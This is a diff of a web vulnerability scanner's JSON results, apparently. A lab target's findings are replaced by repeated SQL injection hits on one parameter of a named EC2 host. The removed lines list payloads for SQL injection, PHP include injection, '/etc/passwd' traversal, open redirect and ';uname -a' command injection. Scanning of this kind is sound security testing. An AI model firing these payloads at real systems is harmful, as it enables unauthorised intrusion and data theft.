@@ -2,69 +2,237 @@
     {
         "class": "SQL Injection", 
         "results": {
-            "http://target.com": [
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": [
                 {
-                    "endpoint": "/sqli/dynamic.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' or '1=1"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/sqli.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' or '1=1"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/dynamic.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' or '1'='1"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/sqli.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' or '1'='1"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/dynamic.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "'or 1=1#"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/sqli.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "'or 1=1#"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/dynamic.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' OR '1=1 %00"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/sqli.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "' OR '1=1 %00"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
                 }, 
                 {
-                    "endpoint": "/sqli/doublesqliaction.php", 
+                    "endpoint": "/selections.php", 
                     "params": {
-                        "username": "\" or \"1=1"
+                        "artist": "\" or \"1=1"
                     }, 
-                    "method": "POST"
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
+                }, 
+                {
+                    "endpoint": "/selections.php", 
+                    "params": {
+                        "artist": "\" or \"1=1"
+                    }, 
+                    "method": "GET"
                 }
             ]
         }
@@ -72,282 +240,31 @@
     {
         "class": "Server Side Code Injection", 
         "results": {
-            "http://target.com": [
-                {
-                    "endpoint": "/serverside/eval.php", 
-                    "params": {
-                        "page": "1; include('../index.php')"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/eval2.php", 
-                    "params": {
-                        "page": "';include('../index.php');echo'"
-                    }, 
-                    "method": "POST"
-                }, 
-                {
-                    "endpoint": "/serverside/eval2.php", 
-                    "params": {
-                        "page": "\";include(\"../index.php\");echo\""
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi1.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/rfi.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi1.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi1.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi1.php", 
-                    "params": {
-                        "page": "../../index"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../index.php"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../index.php"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../index.php"
-                    }, 
-                    "method": "GET"
-                }
-            ]
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": []
         }
     }, 
     {
         "class": "Directory Traversal", 
         "results": {
-            "http://target.com": [
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/directorytraversal/directorytraversal.php", 
-                    "params": {
-                        "ascii": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/serverside/lfi2.php", 
-                    "params": {
-                        "page": "../../../../../../../etc/passwd"
-                    }, 
-                    "method": "GET"
-                }
-            ]
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": []
         }
     }, 
     {
         "class": "Open Redirect", 
         "results": {
-            "http://target.com": [
-                {
-                    "endpoint": "/openredirect/openredirect.php", 
-                    "params": {
-                        "redirect": "https://status.github.com/messages"
-                    }, 
-                    "method": "GET"
-                }, 
-                {
-                    "endpoint": "/openredirect/openredirect.php", 
-                    "params": {
-                        "redirect": "https%3A%2F%2Fstatus.github.com"
-                    }, 
-                    "method": "GET"
-                }
-            ]
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": []
         }
     }, 
     {
         "class": "Cross Site Request Forgery", 
         "results": {
-            "http://target.com": [
-                {
-                    "endpoint": "/csrf/csrf.php", 
-                    "params": {
-                        "csrftoken": "abcdef1235", 
-                        "secret": "SECRET"
-                    }, 
-                    "method": "POST"
-                }
-            ]
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": []
         }
     }, 
     {
         "class": "Shell Command Injection", 
         "results": {
-            "http://target.com": [
-                {
-                    "endpoint": "/commandinjection/commandinjection.php", 
-                    "params": {
-                        "host": ";uname -a"
-                    }, 
-                    "method": "POST"
-                }
-            ]
+            "http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080": []
         }
     }
 ]
